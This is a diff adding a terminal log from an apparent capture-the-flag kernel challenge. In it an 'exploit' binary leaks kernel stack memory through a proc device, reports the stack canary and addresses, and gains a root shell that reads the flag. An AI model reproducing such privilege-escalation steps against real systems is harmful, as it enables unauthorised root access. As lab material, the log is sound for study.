@@ -1,0 +1,62 @@
+/ $ ls
+ls
+bin          exploit      init         root         thejumps.ko
+dev          flag         linuxrc      sbin         usr
+etc          home         proc         sys
+/ $ ls  -l
+ls  -l
+total 1092
+drwxr-xr-x    2 root     0             1900 May 24 04:22 bin
+drwxr-xr-x    2 root     0               60 May 18 04:17 dev
+drwxr-xr-x    2 root     0               80 May 24 05:03 etc
+-rwxr-xr-x    1 ctf      1000        821512 May 24 05:03 exploit
+-rw-------    1 root     0               39 May 24 04:22 flag
+drwxr-xr-x    3 root     0               60 May 24 05:03 home
+-rwxr-xr-x    1 root     0              483 May 24 04:22 init
+lrwxrwxrwx    1 root     0               11 May 24 04:22 linuxrc -> bin/busybox
+dr-xr-xr-x   53 root     0                0 May 24 05:03 proc
+drwx------    2 root     0               40 May 18 04:17 root
+drwxr-xr-x    2 root     0             1480 May 24 04:22 sbin
+dr-xr-xr-x   12 root     0                0 May 24 05:03 sys
+-rw-r--r--    1 root     0           282848 May 24 04:22 thejumps.ko
+drwxr-xr-x    4 root     0               80 May 24 04:22 usr
+/ $ ./exploit
+./exploit
+[   22.698858] Proc device opened
+fd = 3
+read = 256
+
+Dumping 256 bytes.
+
+ADDR[000, 0x000]:	00007ffcae3098a0: 0x0000000000000000 - 0x0000000000000000
+ADDR[002, 0x010]:	00007ffcae3098b0: 0x0000000000000000 - 0xc8df3570d14c7f00
+ADDR[004, 0x020]:	00007ffcae3098c0: 0xc8df3570d14c7f00 - 0x0000000000000100
+ADDR[006, 0x030]:	00007ffcae3098d0: 0xffff888006b509c0 - 0xffffffff8123e397
+ADDR[008, 0x040]:	00007ffcae3098e0: 0x0000000000000001 - 0x0000000000000000
+ADDR[010, 0x050]:	00007ffcae3098f0: 0xffffffff811c8a08 - 0xffff888006ba1100
+ADDR[012, 0x060]:	00007ffcae309900: 0xffff888006ba1100 - 0x00007ffcae3098a0
+ADDR[014, 0x070]:	00007ffcae309910: 0x0000000000000100 - 0x0000000000000000
+ADDR[016, 0x080]:	00007ffcae309920: 0x0000000000000000 - 0xffffffff811c8d2a
+ADDR[018, 0x090]:	00007ffcae309930: 0x0000000000000000 - 0xc8df3570d14c7f00
+ADDR[020, 0x0a0]:	00007ffcae309940: 0x0000000000000000 - 0xffffc900001aff58
+ADDR[022, 0x0b0]:	00007ffcae309950: 0x0000000000000000 - 0x0000000000000000
+ADDR[024, 0x0c0]:	00007ffcae309960: 0xffffffff810025d3 - 0x0000000000000000
+ADDR[026, 0x0d0]:	00007ffcae309970: 0x0000000000000000 - 0xffffffff81c0007c
+ADDR[028, 0x0e0]:	00007ffcae309980: 0x0000000000000001 - 0x00000000004ad868
+ADDR[030, 0x0f0]:	00007ffcae309990: 0x00007ffcae309ad8 - 0x00007ffcae309ac8
+[*] canary = 0xc8df3570d14c7f00
+[*] stack = 0xffffc900001aff58
+
+
+/bin/sh: can't access tty; job control turned off
+/ # id
+id
+uid=0(root) gid=0
+/ # ls
+ls
+bin          exploit      init         root         thejumps.ko
+dev          flag         linuxrc      sbin         usr
+etc          home         proc         sys
+/ # cat flag
+cat flag
+flag{682cc8a83e022703fe1527b1b3bba748}
